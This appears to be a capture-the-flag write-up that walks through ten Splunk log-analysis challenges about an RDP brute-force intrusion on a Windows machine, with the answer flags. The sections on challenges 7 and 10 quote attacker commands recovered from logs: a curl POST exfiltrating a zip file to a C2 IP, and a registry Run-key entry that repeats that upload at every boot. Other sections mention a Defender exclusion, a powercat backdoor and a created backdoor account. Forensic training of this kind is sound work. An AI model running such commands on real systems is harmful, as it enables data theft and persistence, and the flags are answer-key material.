# Happy SPLUNKing

This part will cover the solution for Happy SPLUNKing #1 until #10.

***

## Setting Up

Upload the given virtual machine disk file in VMware Workstation Pro.

Check if the machine have it's own IP address. If not, change the network adapter from bridge to NAT.

<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

Then, check if Splunk is running using `systemctl status splunk`

Access the splunk on browser using **http://\<machine\_ip>:8000**

That's all.

***

## SPLUNKing 1

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

As mentioned in the challenge descriptionn, TodakX SOC have been attacked by someone via RDP brute force. [RDP](https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/) is Remote Desktop Protocol, as the name says, it allows employees to remotely connect to a physical computer from a distance.

Here, the attacker is trying to guess the correct credentials for user **admin**. From Splunk itself, notice that IP address **192.168.8.52** has the most event for destination IP, which indicates that IP was being attacked via brute force.

<figure><img src="../../../.gitbook/assets/image (115).png" alt="" width="375"><figcaption></figcaption></figure>

Filter out the destination IP address.&#x20;

If there is a destination, there must be a source. By examining the source IP, it is evident that **192.168.8.41** has the most events. This IP address is likely the attacker's. Additionally, the attacker most likely used a script in an attempt to obtain the correct credentials for the victim's IP address.

<figure><img src="../../../.gitbook/assets/image (116).png" alt="" width="375"><figcaption></figcaption></figure>

The source IP address can be filtered out by examining the logs in detail, revealing the IP of **DESKTOP-9O75B7U**, which is an account domain for the user **admin**.

<figure><img src="../../../.gitbook/assets/image (117).png" alt="" width="499"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (118).png" alt="" width="529"><figcaption></figcaption></figure>

### Flag

ihack24{admin:192.168.8.52}

***

## SPLUNKing 2

<figure><img src="../../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

As mentioned in the previous challenge, the attacker’s IP address is **192.168.8.41**

### **Flag**

ihack24{192.168.8.41}

***

## SPLUNKing 3

<figure><img src="../../../.gitbook/assets/image (120).png" alt="" width="271"><figcaption></figcaption></figure>

When the attacker runs the brute force script, it attempts each credential from the attacker's wordlist. This results in numerous failed login attempts and one successful attempt. After completing its task, the script displays the correct credential as the result of the brute force attack. Only then can the attacker manually log in using the discovered credentials.

Here, the brute force process stopped at **9.55.50 PM**.

<figure><img src="../../../.gitbook/assets/image (121).png" alt="" width="375"><figcaption></figcaption></figure>

Filtering out event ID **4672** reveals all successful logins. Identify the timestamp close to when the script finished running, which is two minutes later when the attacker manually logged in as user **admin** at **7/23/24 9:55:52.000 PM**.

<figure><img src="../../../.gitbook/assets/image (122).png" alt="" width="563"><figcaption></figcaption></figure>

### Flag

ihack24{07/23/24 09:55:52 PM}

***

## SPLUNKing 4

<figure><img src="../../../.gitbook/assets/image (123).png" alt="" width="283"><figcaption></figcaption></figure>

After the attacker successfully login as user admin the first thing they will face is a CMD (Command Prompt). Filtering out parent command line that have **"C:\Windows\system32\cmd.exe"**. Then look for the nearest timestamp after the attacker log in to the machine.

<figure><img src="../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

Here the first command executed by the attacker after the login is **systemifo**.

### Flag

ihack24{systeminfo}

***

## SPLUNKing 5

<figure><img src="../../../.gitbook/assets/image (125).png" alt="" width="272"><figcaption></figcaption></figure>

To determine which path is being excluded by Microsoft Defender, select the Windows PowerShell log as the source type.

<figure><img src="../../../.gitbook/assets/image (126).png" alt="" width="375"><figcaption></figcaption></figure>

Anything related to modifying Windows Defender, attacker can use command like **Add-MpPreference**

{% embed url="https://learn.microsoft.com/en-us/powershell/module/defender/?view=windowsserver2022-ps" %}

Filter out the keyword **Add-MpPreference**. The displayed command is the command to exclude the path from being detected by Micorsoft Defender.

<figure><img src="../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

### Flag

ihack24{C:\Windows\microsoft}

***

## SPLUNKing 6

<figure><img src="../../../.gitbook/assets/image (128).png" alt="" width="267"><figcaption></figcaption></figure>

Again, lookout for any suspicious command excuted from the powershell.transript log.

In the same timestamp as the previous challenge, there was a powershell command excuted with a tool called **powercat** (basically a ncat or nc for windows) and an IP address act as a backdoor.

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

### Flag

ihack24{157.230.33.7}

***

## SPLUNKing 7

<figure><img src="../../../.gitbook/assets/image (130).png" alt="" width="258"><figcaption></figcaption></figure>

Again, looking at the same log, there was also encoded powershell command executed in order to exfiltrate the data from the host desktop to the attacker’s C2 server (Command and Control).

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Decode the encoded strings from decimal to ascii.

Decoded strings:

`cmd.exe /c curl -XPOST 157.230.33.7/upload -F files=@C:\Users\admin\Downloads\DESKTOP-97O75B7U.zip`

### Flag

ihack24{DESKTOP-97O75B7U.zip}

***

## SPLUNKing 8

<figure><img src="../../../.gitbook/assets/image (132).png" alt="" width="215"><figcaption></figcaption></figure>

Also, around the same timestamp, there was another powershell command which acted as a **dropper.**

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

### Flag

ihack24{nmap.exe}

***

## SPLUNKing 9

<figure><img src="../../../.gitbook/assets/image (134).png" alt="" width="258"><figcaption></figcaption></figure>

To find newly created users from Splunk logs, search for the command **net user**, as the logs are retrieved from a Windows OS.

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

Here the newly created user is named **operator** with the password **operator123**.

### Flag

ihack24{operator:operator123}

***

## SPLUNKing 10

<figure><img src="../../../.gitbook/assets/image (136).png" alt="" width="263"><figcaption></figcaption></figure>

This type of TTP used by the attacker was a good move. To search for it, filter out the defined rule name in Splunk. For this case, we choose **T1012**, which is **Query Registry** because it looks more interesting than the other.

Below is the output that displays after the filtering. Basically, what the attacker trying to do is, everytime the computer starts, it will upload **C:\Users\admin\Documents\DESKTOP-9O75B7U.zip** to their C2 server.

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

### Flag

ihack24{reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v report /t REG\_SZ /d 'cmd.exe /c curl -XPOST 157.230.33.7/upload -F files=@C:\Users\admin\Documents\DESKTOP-9O75B7U.zip' /f}

